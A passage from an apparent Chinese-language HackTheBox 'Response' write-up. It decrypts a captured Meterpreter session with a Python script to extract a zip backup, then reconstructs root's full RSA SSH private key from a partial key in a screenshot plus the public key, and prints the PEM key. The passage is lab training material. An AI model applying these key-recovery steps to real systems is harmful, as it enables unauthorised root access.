TLV l=24       t=TLV_TYPE_UUID              v=b'\xd2\x99\x93k\xe4W`\x99f `"\x04\x0fx\xaa'
TLV l=12       t=TLV_TYPE_COMMAND_ID        v=CORE_CHANNEL_READ
TLV l=12       t=TLV_TYPE_CHANNEL_ID        v=b'\x00\x00\x00\x01'
TLV l=41       t=TLV_TYPE_REQUEST_ID        v=b'71560517686021057956178610979680\x00'
TLV l=12       t=TLV_TYPE_RESULT            v=b'\x00\x00\x00\x00'
TLV l=8        t=TLV_TYPE_CHANNEL_DATA      v=b''
```

如果它是TLV_TYPE_CHANNEL_DATA，将其保存到一个文件中。如果有很多文件，从channel打开请求中解析文件名，然后根据channel id保存。假设只有一个文件，如果TLV类型是CHANNEL_DATA，创建该文件并保存到其中。在脚本顶部，将清除该文件中的任何现有数据(否则在一行中运行两次将给出双zip):

``` bash
open('docs_backup.zip', 'w').close() # clear zip file
```

现在解析tlv的循环中，将添加一个CHANNEL_DATA检查:

``` bash
    while j < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if j + l > len(tlv_data) or l == 0:
            break
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        if t == 0x20001: #COMMAND_ID
            v = cmd_ids[int.from_bytes(v[:4], 'big')]
        elif t == 0x40034: #CHANNEL_DATA
            with open('docs_backup.zip', 'ab') as f:
                f.write(v)
        if len(v) > 200:
            v = v[:200]
        print(f"TLV l={l:<8} t={tlv_types[t]:<26} v={v}")
        j += l
```

运行脚本得到zip:

``` bash
kali@hacky$ file docs_backup.zip 
docs_backup.zip: Zip archive data, at least v1.0 to extract
```

 - 完整脚本parse_msf.py:

``` bash
#!/usr/bin/env python3

import uuid
from Crypto.Cipher import AES
from scapy.all import *
from msfconsts import tlv_types, cmd_ids

enc_types = {0: "None", 1: "AES256", 2: "AES128"}
packet_types = {0: "Req", 1: "Resp"}
aes_key = bytes.fromhex('f2 00 3c 14 3d c8 43 6f 39 ad 6f 8f c4 c2 4f 3d 35 a3 5d 86 2e 10 b4 c6 54 ae dc 0e d9 dd 3a c5')
open('docs_backup.zip', 'w').close() # clear zip file


def xor(buf, key):
    return bytes([x ^ key[i % len(key)] for i, x in enumerate(buf)])


# pull all bytes into a stream
pcap = rdpcap("./msf.pcap")
stream = b"".join([bytes(packet[TCP].payload) for packet in pcap if TCP in packet])

i = 0
while i < len(stream):
    xor_head = stream[i:i+32]
    xor_key = xor_head[:4]
    head = xor(xor_head, xor_key)
    session_guid = head[4:20]
    enc_flag = int.from_bytes(head[20:24], "big")
    packet_len = int.from_bytes(head[24:28], "big")
    packet_type = int.from_bytes(head[28:32], "big")

    print(f"Packet: type={packet_types[packet_type]:<4} len={packet_len:<8} enc={enc_types[enc_flag]} sess={uuid.UUID(bytes=session_guid)}")

    tlv_data = xor(stream[i+32:i+packet_len+24], xor_key)
    if enc_flag == 1:
        aes_iv = tlv_data[:16]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
        tlv_data = cipher.decrypt(tlv_data[16:])

    j = 0
    while j < len(tlv_data):
        l = int.from_bytes(tlv_data[j:j+4], 'big')
        if j + l > len(tlv_data) or l == 0:
            break
        t = int.from_bytes(tlv_data[j+4:j+8], 'big')
        v = tlv_data[j+8:j+l]
        if t == 0x20001: #COMMAND_ID
            v = cmd_ids[int.from_bytes(v[:4], 'big')]
        elif t == 0x40034: #CHANNEL_DATA
            with open('docs_backup.zip', 'ab') as f:
                f.write(v)
        if len(v) > 50:
            v = v[:50]
        print(f"TLV l={l:<8} t={tlv_types[t]:<26} v={v}")
        j += l
    
    i += 24 + packet_len
```

#### 破碎ssh key 复原
#### 检查 docs_backup.zip

zip文件有一个Documents文件夹的备份:

``` bash
kali@hacky$ zipinfo docs_backup.zip 
Archive:  docs_backup.zip
Zip file size: 1274538 bytes, number of entries: 6
drwxr-xr-x  3.0 unx        0 bx stor 22-Mar-14 09:37 Documents/
-rw-rw-r--  3.0 unx      245 tx defN 22-Mar-14 09:37 Documents/.tmux.conf
-rw-rw-r--  3.0 unx  1278243 bx defN 22-Jun-15 11:37 Documents/Screenshot from 2022-06-15 13-37-42.png
-rw-rw-r--  3.0 unx       95 tx defN 22-Mar-14 09:37 Documents/.vimrc
-rw-------  3.0 unx     1522 tx defN 22-Mar-14 08:57 Documents/bookmarks_3_14_22.html
-rw-------  3.0 unx      567 tx defN 22-Mar-14 09:36 Documents/authorized_keys
6 files, 1280672 bytes uncompressed, 1273444 bytes compressed:  0.6%
```

authorized_keys文件在Response上只有root用户的公钥。它本身用处不大。bookmarks_3_14_22.html文件有几个指向twitter页面和另一个黑客网站的链接。.tmux.conf或.vimrc文件中没有任何有价值的内容。

截图很有趣:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response7.png)

它是用户的Ubuntu桌面，有Response站点，文件管理器，一些更新，还有一个终端。有趣的是，终端有一个私有SSH密钥的结尾:

#### RSA背景

一般来说，有一些与RSA相关的变量。

 - 从随机质数p和q开始。

 - N = p * q， φ = (p-1) * (q-1)。

 - E是一个大于1但小于φ的数。它几乎总是设置为0x10001(65537)。

 - D是e mod φ的模乘逆。这听起来很复杂，但这只是一行Python代码。

要加密一条消息，m，你要把它转换成一个整数，加密后的整数是m^e mod n。要解密，用c^d mod n，就是这样。

SSH公钥格式将在[RFC4253 section 6.6](https://www.rfc-editor.org/rfc/rfc4253#section-6.6)中讨论。通常，公钥有三个字段:

 - 密钥类型
 - base64编码的值团
 - 注释(通常是用户的电子邮件地址)

定义了值blob的ssh-rsa格式:

``` bash
The "ssh-rsa" key format has the following specific encoding:

string    "ssh-rsa"
mpint     e
mpint     n
```

key中的每一项都是[4 byte length][value]的形式。私钥结构不在RFC中，但在这篇[博文](https://dnaeon.github.io/openssh-private-key-binary-format/)中描述为:

``` bash
;; AUTH_MAGIC is a hard-coded, null-terminated string,
;; set to "openssh-key-v1".
byte[n] AUTH_MAGIC

;; ciphername determines the cipher name (if any),
;; or is set to "none", when no encryption is used.
string   ciphername

;; kdfname determines the KDF function name, which is
;; either "bcrypt" or "none"
string   kdfname

;; kdfoptions field.
;; This one is actually a buffer with size determined by the
;; uint32 value, which preceeds it.
;; If no encryption was used to protect the private key,
;; it's contents will be the [0x00 0x00 0x00 0x00] bytes (empty string).
;; You should read the embedded buffer, only if it's size is
;; different than 0.
uint32 (size of buffer)
    string salt
    uint32 rounds

;; Number of keys embedded within the blob.
;; This value is always set to 1, at least in the
;; current implementation of the private key format.
uint32 number-of-keys

;; Public key section.
;; This one is a buffer, in which the public key is embedded.
;; Size of the buffer is determined by the uint32 value,
;; which preceeds it.
;; The public components below are for RSA public keys.
uint32 (size of buffer)
    string keytype ("ssh-rsa")
    mpint  e       (RSA public exponent)
    mpint  n       (RSA modulus)

;; Encrypted section
;; This one is a again a buffer with size
;; specified by the uint32 value, which preceeds it.
;; The fields below are for RSA private keys.
uint32 (size of buffer)
    uint32  check-int
    uint32  check-int  (must match with previous check-int value)
    string  keytype    ("ssh-rsa")
    mpint   n          (RSA modulus)
    mpint   e          (RSA public exponent)
    mpint   d          (RSA private exponent)
    mpint   iqmp       (RSA Inverse of Q Mod P, a.k.a iqmp)
    mpint   p          (RSA prime 1)
    mpint   q          (RSA prime 2)
    string  comment    (Comment associated with the key)
    byte[n] padding    (Padding according to the rules above)
```

这里还有很多! 私钥包括公钥，也包括d、p、q。

#### Recover Key

现在假设authorized_keys文件中的公钥与屏幕截图中的部分私钥配对。因为只有部分私钥，所以将从公钥开始:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# cat authorized_keys | cut -d' ' -f2 | base64 -d | hexdump -C
00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 03 01  |....ssh-rsa.....|
00000010  00 01 00 00 01 81 00 9e  3a 2c fb b9 52 5a d7 f1  |........:,..RZ..|
00000020  b2 ea 97 a9 03 af 1b 4f  69 e5 33 61 3a 78 d5 51  |.......Oi.3a:x.Q|
00000030  2e 9a 08 94 dc 91 7a 94  24 e8 de d3 90 14 b2 9d  |......z.$.......|
00000040  04 a1 a1 97 ac 07 22 76  83 7a 53 89 65 d9 22 b6  |......"v.zS.e.".|
00000050  8f f3 4b a9 29 bd 45 be  f2 d3 ed b5 88 1f b6 2b  |..K.).E........+|
00000060  cc 11 ef b6 30 08 af 2b  a1 df 96 79 8b fa f0 69  |....0..+...y...i|
00000070  d4 14 02 9a 1d 3d 2c fe  c0 c6 10 69 89 b7 66 54  |.....=,....i..fT|
00000080  49 07 3f 14 96 4a 12 38  f0 bd 7d 45 6b ac ca 11  |I.?..J.8..}Ek...|
00000090  50 88 ee 7e 6d f8 c2 90  4d b7 3c 6d ed f7 1b 11  |P..~m...M.<m....|
000000a0  95 f3 be 37 d7 8e 8b f9  b6 42 a0 39 1f 67 f9 89  |...7.....B.9.g..|
000000b0  02 96 ab 76 64 eb 3e cc  dc 90 39 ea 73 58 5a 5d  |...vd.>...9.sXZ]|
000000c0  5b 61 7c f0 dd 9b e6 59  bd df 6e 70 78 93 30 f4  |[a|....Y..npx.0.|
000000d0  c1 81 94 72 78 cb 6e 68  d6 d8 7b af de 2a 01 e8  |...rx.nh..{..*..|
000000e0  05 08 8b 9a 13 8f cb 5e  31 f2 5d 83 45 cc 86 1b  |.......^1.].E...|
000000f0  a7 bc 98 29 c1 05 9f 3f  09 ad 1a 05 78 07 7b ba  |...)...?....x.{.|
00000100  1a 90 26 2f 99 1e 23 d1  7d 20 08 c5 af ef 40 e6  |..&/..#.} ....@.|
00000110  40 37 99 0b ca 14 8f ec  2b e0 a5 dc 3c 11 a5 94  |@7......+...<...|
00000120  83 16 4e 84 9e d4 b3 85  6e 66 b2 5f 47 bd d3 bb  |..N.....nf._G...|
00000130  25 07 c2 40 05 2d 46 53  f0 4a e8 bd 36 ce 22 94  |%..@.-FS.J..6.".|
00000140  85 97 0d 60 7e 13 4e 50  ee fc c2 07 3b f2 77 8b  |...`~.NP....;.w.|
00000150  2a ae 6a a3 cf 0c 46 07  52 f4 19 08 91 ce 78 9c  |*.j...F.R.....x.|
00000160  1e 1d 09 91 d2 aa ba e7  0e 1c c6 1b c3 0d 12 11  |................|
00000170  87 88 25 b6 35 43 e3 79  9d 83 f2 f1 e7 1a 7f 97  |..%.5C.y........|
00000180  21 08 72 dc 12 c3 3d 62  91 e6 8e 05 d6 f0 8b e8  |!.r...=b........|
00000190  05 ff a2 e7 f5 49 51                              |.....IQ|
00000197
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response8.png)

在这里突出显示了三个 长度-值 对:

 - 密钥格式[橙色] - 7字节，"ssh-rsa"

 - E[蓝色] - 3字节，0x010001

 - N[黄色] - 0x181字节，big int

现在可以写一个小脚本解析这个文件获取n，e:

``` python
#!/usr/bin/env python3
import sys
from base64 import b64decode

def parse_pubkey(pk):
	keytype_len = int.from_bytes(pk[:0x4], 'big')
	keytype = pk[0x4:0x4+keytype_len]
	pk = pk[0x4+keytype_len:]
	e_len = int.from_bytes(pk[:0x4], 'big')
	e = int.from_bytes(pk[0x4:0x4+e_len], 'big')
	pk = pk[0x4+e_len:]
	n_len = int.from_bytes(pk[:0x4], 'big')
	n = int.from_bytes(pk[0x4:0x4+n_len], 'big')

	print('keytype = %s' % keytype.decode())
	print('e = 0x%x' % e)
	print('N = 0x%x' % n)

if (len(sys.argv) < 2):
	print('usage:\n %s <pubkey file>' % sys.argv[0])
	quit()

d = open(sys.argv[1], 'rb').read()
pk = b64decode(d.split(b' ')[1])
parse_pubkey(pk)
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# python parse_pubkey.py authorized_keys                      
keytype = ssh-rsa
e = 0x10001
N = 0x9e3a2cfbb9525ad7f1b2ea97a903af1b4f69e533613a78d5512e9a0894dc917a9424e8ded39014b29d04a1a197ac072276837a538965d922b68ff34ba929bd45bef2d3edb5881fb62bcc11efb63008af2ba1df96798bfaf069d414029a1d3d2cfec0c6106989b7665449073f14964a1238f0bd7d456bacca115088ee7e6df8c2904db73c6dedf71b1195f3be37d78e8bf9b642a0391f67f9890296ab7664eb3eccdc9039ea73585a5d5b617cf0dd9be659bddf6e70789330f4c181947278cb6e68d6d87bafde2a01e805088b9a138fcb5e31f25d8345cc861ba7bc9829c1059f3f09ad1a0578077bba1a90262f991e23d17d2008c5afef40e64037990bca148fec2be0a5dc3c11a59483164e849ed4b3856e66b25f47bdd3bb2507c240052d4653f04ae8bd36ce229485970d607e134e50eefcc2073bf2778b2aae6aa3cf0c460752f4190891ce789c1e1d0991d2aabae70e1cc61bc30d1211878825b63543e3799d83f2f1e71a7f97210872dc12c33d6291e68e05d6f08be805ffa2e7f54951
```

或者使用RsaCtfTool的--dumpkey和--publickey来dump key的值:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# python /root/RsaCtfTool-master/RsaCtfTool.py --publickey authorized_keys --dumpkey
private argument is not set, the private key will not be displayed, even if recovered.
Details for authorized_keys:
n: 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
e: 65537
```

至于私钥，首先需要从截图中获取文本。在OCR上部分字符识别错误，最后大部分都是用手输入:

``` bash
ntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaV
MrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE
7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKD
K26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBs
Z7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ==
```

如果尝试Base64解码这一部分，将得到一个错误，这是因为它是在字节边界上切割的，这将使后面的所有数据都是错误的。Base64编码需要3个字节，输出4个字符。所以如果从这四个字符块的中间开始，就会出错。可以用A填充起始点，直到它被固定。每个A在前面加6个空位。在两个a之后，就不再有错误了。使用两个A字符作为填充:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# (echo -n AA;cat partial_key)|grep -v '-'|base64 -d|hexdump -C
00000000  00 09 ed 11 dd ca 9d 63  69 91 bc 29 db cb d5 81  |.......ci..)....|
00000010  ab 14 3a ad c2 40 16 c3  39 00 00 00 c1 00 c7 0b  |..:..@..9.......|
00000020  1a 19 70 99 c0 c6 ff 24  7f 3c 5e f1 a1 bb 50 68  |..p....$.<^...Ph|
00000030  db 3a 26 22 16 95 32 b6  cd e7 1e 2a dd ce d9 d2  |.:&"..2....*....|
00000040  ef 60 9a 45 ce f8 d5 8c  a5 7e d3 db 49 74 38 11  |.`.E.....~..It8.|
00000050  08 86 b5 ba 0d 03 ac c6  2b 3f 0a b4 b9 bb af 45  |........+?.....E|
00000060  ea d5 19 8e 55 1d 34 4d  73 20 4e c8 16 fd 90 ba  |....U.4Ms N.....|
00000070  b3 30 34 bf 3d fd 29 e5  41 b7 b6 e3 16 fe 22 36  |.04.=.).A....."6|
00000080  9f 29 46 8e 3e c3 5c a4  56 a4 3f 8b f1 9c a2 fe  |.)F.>.\.V.?.....|
00000090  bb 0e aa 16 8a 91 75 26  72 9d d8 00 ad 92 83 2b  |......u&r......+|
000000a0  6e 99 ed 9c dd 57 69 67  da 4c a2 2d fa 24 37 c5  |n....Wig.L.-.$7.|
000000b0  9b 63 11 de 43 fe ff 8d  50 57 7f bd 41 53 5f 97  |.c..C...PW..AS_.|
000000c0  83 c5 f8 e2 78 d5 a7 75  df f6 03 ba 71 85 5a a9  |....x..u....q.Z.|
000000d0  bd 71 06 c6 7b 6c 6f 16  6a b9 32 72 3e d9 00 00  |.q..{lo.j.2r>...|
000000e0  00 0d 72 6f 6f 74 40 72  65 73 70 6f 6e 73 65 01  |..root@response.|
000000f0  02 03 04 05                                       |....|
000000f4
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/response9.png)

注意前12位是我加的，所以这三个十六进制0。将扫描输出，寻找看起来可能是长度的4字节的块。如果是一个长度，那么下一个长度应该是后面这么多字节。这里有两点:

 - p[紫色]的末尾 - 000不是一个部件，因为我添加了这个，之前没有关于大小的信息

 - Q[红色] - 0xc1字节，large int

 - 注释[绿色] - 0xd字节，"root@response"，匹配公共注释。

 - Padding [tan]

记住只选择c70b和3ed9之间的值，如上图中突出显示的那样。

从这里得到的唯一值是q，但这就是所需要的。在Python shell中进行计算，从恢复的三个值开始:

``` bash
>>> n = 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
>>> e = 0x10001
>>> q = int('c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a917526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd41535f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9', 16)
```

通过n和q，可以计算出p:

``` bash
>>> p = n//q
>>> print(p)
1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681
>>> p*q == n
True
```

现在计算φ:

``` bash
>>> phi = (p-1)*(q-1)
>>> print(phi)
3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658228956375725012986129862726232754859317683887903858009990384898592815614700937210104609413404646477835982769446642620001985573386135264174659566853632803857877843123634985205607857456627847123705219756960372119762762326915119400492083811597718754804423893011082806582970563249860226508474929593549697651100023590711018803530679241541686077829536630628187078798865270742866534980339315709884044330134828157994491187086808483649524106296755673106409592022829166774080
```

然后 d:

``` bash
>>> d = pow(e, -1, phi)
>>> print(d)
1625619800302939310497362620230641471210180025458598505869372927954809509931819534142478050164710428301711420105256888263738825436005928647640406894785051174267802855289674336215539460237234455828796713319435253333834397500702867880183585224913668715341142159155411076726343273522797240978201714911564891529128911291065564839717398383717067174500706045619907216257663831917133776799370366311218755291043602785034846595021426505315894699616700644573501762746772657477999721701257281734395644076425163734698782481150440433952442877142502354502400228287772035048863902967323525436554296229036523388132843269428678231998157309694954758549374935238691856877188975238247314353622551508912089241384258154784386155226013654968015424436833187537167598768732947206015220857044687732676136043773063354998578298201052105386854915970556061201166518041208286877828701272183657345433824458258168785722284819778518101546716703470060292326273
```

这就是私钥所需的全部内容。有许多方法可以将其重新构建为可以用于SSH的私钥。再次使用RsaCtfTool，这次传递--private来输出私钥，以及-n、-p、-q和-e及其值。它将从那里完成其余的工作:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response]
└─# python /root/RsaCtfTool-master/RsaCtfTool.py --private -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217 -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 -e 65537

Results for /tmp/tmpl_4h_wqn:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEAnjos+7lSWtfxsuqXqQOvG09p5TNhOnjVUS6aCJTckXqUJOje
05AUsp0EoaGXrAcidoN6U4ll2SK2j/NLqSm9Rb7y0+21iB+2K8wR77YwCK8rod+W
eYv68GnUFAKaHT0s/sDGEGmJt2ZUSQc/FJZKEjjwvX1Fa6zKEVCI7n5t+MKQTbc8
be33GxGV8743146L+bZCoDkfZ/mJApardmTrPszckDnqc1haXVthfPDdm+ZZvd9u
cHiTMPTBgZRyeMtuaNbYe6/eKgHoBQiLmhOPy14x8l2DRcyGG6e8mCnBBZ8/Ca0a
BXgHe7oakCYvmR4j0X0gCMWv70DmQDeZC8oUj+wr4KXcPBGllIMWToSe1LOFbmay
X0e907slB8JABS1GU/BK6L02ziKUhZcNYH4TTlDu/MIHO/J3iyquaqPPDEYHUvQZ
CJHOeJweHQmR0qq65w4cxhvDDRIRh4gltjVD43mdg/Lx5xp/lyEIctwSwz1ikeaO
Bdbwi+gF/6Ln9UlRAgMBAAECggGAR6IC13uRAzucWunF+2iFkBGl2XQnYndt67Dz
X0s1iE88XnFm39Ts6egYPqyPo/we6BSh/svHZkRG7mixKkaRP9Aw0y1c7+GbcbyT
qjiLCoNzd3doAmMTGmBu+RgseWxGwJa5lJiTFoqnQeCb+FAJ/LH2m3LpSNQTLz+M
npxyYRqEhgqcuw/uvTx67LyDP31zdXvEMhFqXIImOxvHSHRr5CSO/mSZ9dpcHsPO
IOhTC89/dWx/7T9JM/K64FU6deFyxplJMXePDvX5OZyRj9fjX8cvr+SMxiWCcjYU
Ar1H6hxq/mWbNcDiwIXc0OKc+oFPH6zITwHeCrUkrAegVOP1MBf5WgX1gltHaK4W
X5xhTHlI/f2rKIL4fISDvIihmgqUQ64u8ZwnDXIPAB0tkYpFSuFchBNIRUd87Yf3
9i0NcNySOxYo9iI3u3nEwiYSLC/tWv98N3ahpVN53WC6YLqbMCpG2IELyuw7Il5K
k3t904GGEmkfNXhM27b0B2pfyMOBAoHBAMuBGArAEKvvTrGm+wQJjaLm15xs2nwP
vRu9Xjr/7spDhWhL69AuKT6RrVn68zErskP8dbIewetkYoUSk/tIYa3vis+8gWCc
Q94vrMKtuqPfbYVYNjOXfJTCfzd3AkAp3ZBszht7n2IQZ2/xp6Agpd5rfS2QZjNv
/YLy8myVGzsnG6bsOVW0eQtfeSf7us093xW+uBlYm7Rf0RpYLkjJZG9e5xIAp88w
HZntEd3KnWNpkbwp28vVgasUOq3CQBbDOQKBwQDHCxoZcJnAxv8kfzxe8aG7UGjb
OiYiFpUyts3nHirdztnS72CaRc741YylftPbSXQ4EQiGtboNA6zGKz8KtLm7r0Xq
1RmOVR00TXMgTsgW/ZC6szA0vz39KeVBt7bjFv4iNp8pRo4+w1ykVqQ/i/Gcov67
DqoWipF1JnKd2ACtkoMrbpntnN1XaWfaTKIt+iQ3xZtjEd5D/v+NUFd/vUFTX5eD
xfjieNWndd/2A7pxhVqpvXEGxntsbxZquTJyPtkCgcATnMFgZ9ozd8CxxlHytaj8
xhqJbMQxqKKlBb8LGJc+zvsQbiCv04MOEKQQQ+skFf38J1yAag5uTSJhiMTSNsuT
I77Q/m3JjcXMp/OSX4PZPzMi4rl2h2buP0BbbBC/dklwHcxPQb6+iK4vT67D8+GI
afuKZJw04NohwKA0brpNHRvBHor4A4iW3AClJdF+7jONuO+tIaj/3SwdydnMEfyn
7xF93qpNgWmY6AwMv/YjGo19ANu57T2t6yksjcf3aaECgcEArmKRqTw32Of/3bAD
6oL02bGnTHrzseXrLZVvbE/H6rExsla7Yi5LGUOvh8dIQdVnF0AFIlDRAln34188
SlrwZvk23nl5fHQhtBMvDF05fLsHNCuNzojG/KjaDOuyNd+NI9iLNZR1R5PN9MVb
/bjUJBHB74z3g+w/aE4ZGSWH4op8lW6/Oai3W8AjluSRKor/dEWS0Ad1nkkpCFwd
bPMY6rzTeEXYukJ3ndHuOBIoJRFaz2AESJVYyTXChBphkipxAoHBAJU2qoufXBcT
dWOy4/AzXlli42JP6+lZ5t1YFN27lx5c5Br5hxRBoQzUvvvA7Idx1nXhkxqTqnG4
RY5pRaDRrbsy2vBEeu4QkWnB7OmjdnkrJJ9HJAMRwaUOKczS/iM4Q9cus7FtAqWH
cyHNIkh4KR2OvAjGn++FFHLXqzXL4qc26BwhBbaAxAiYBJ40hNSA+F2GiTwuUaIj
xDamrrFL/cNhMxyiXyPCgSq7oRfOxvBlnRihR6PyulUZHJkuBm36Iw==
-----END RSA PRIVATE KEY-----
```

解密成功获得ssh私钥
或者使用[rsatool](https://github.com/ius/rsatool)工具

``` bash
┌──(root💀kali)-[~/hackthebox/machine/response/doc_backup]
└─# python /root/rsatool/rsatool.py -f PEM -o private.pem -p 1916050306205333561419340654997247210048413641801348970960079514616664134719102135041323559808823287507117764495506641667502188027100449148337242917863760454705051745311589368966639723256790995465786349803085767646492327358529192956998140247230141324083433547842337416562412168069467780529408980611520951488107555503940773583448434212344944450737794180001456574166216535263941314645573920302378030613909969529154033431308763003703277642056872726635405506000634681 -q 1874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 -e 65537 -n 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217
Using (p, q) to calculate RSA paramaters

n =
9e3a2cfbb9525ad7f1b2ea97a903af1b4f69e533613a78d5512e9a0894dc917a9424e8ded39014b2
9d04a1a197ac072276837a538965d922b68ff34ba929bd45bef2d3edb5881fb62bcc11efb63008af
2ba1df96798bfaf069d414029a1d3d2cfec0c6106989b7665449073f14964a1238f0bd7d456bacca
115088ee7e6df8c2904db73c6dedf71b1195f3be37d78e8bf9b642a0391f67f9890296ab7664eb3e
ccdc9039ea73585a5d5b617cf0dd9be659bddf6e70789330f4c181947278cb6e68d6d87bafde2a01
e805088b9a138fcb5e31f25d8345cc861ba7bc9829c1059f3f09ad1a0578077bba1a90262f991e23
d17d2008c5afef40e64037990bca148fec2be0a5dc3c11a59483164e849ed4b3856e66b25f47bdd3
bb2507c240052d4653f04ae8bd36ce229485970d607e134e50eefcc2073bf2778b2aae6aa3cf0c46
0752f4190891ce789c1e1d0991d2aabae70e1cc61bc30d1211878825b63543e3799d83f2f1e71a7f
97210872dc12c33d6291e68e05d6f08be805ffa2e7f54951

e = 65537 (0x10001)

d =
47a202d77b91033b9c5ae9c5fb68859011a5d9742762776debb0f35f4b35884f3c5e7166dfd4ece9
e8183eac8fa3fc1ee814a1fecbc7664446ee68b12a46913fd030d32d5cefe19b71bc93aa388b0a83
737777680263131a606ef9182c796c46c096b9949893168aa741e09bf85009fcb1f69b72e948d413
2f3f8c9e9c72611a84860a9cbb0feebd3c7aecbc833f7d73757bc432116a5c82263b1bc748746be4
248efe6499f5da5c1ec3ce20e8530bcf7f756c7fed3f4933f2bae0553a75e172c6994931778f0ef5
f9399c918fd7e35fc72fafe48cc6258272361402bd47ea1c6afe659b35c0e2c085dcd0e29cfa814f
1facc84f01de0ab524ac07a054e3f53017f95a05f5825b4768ae165f9c614c7948fdfdab2882f87c
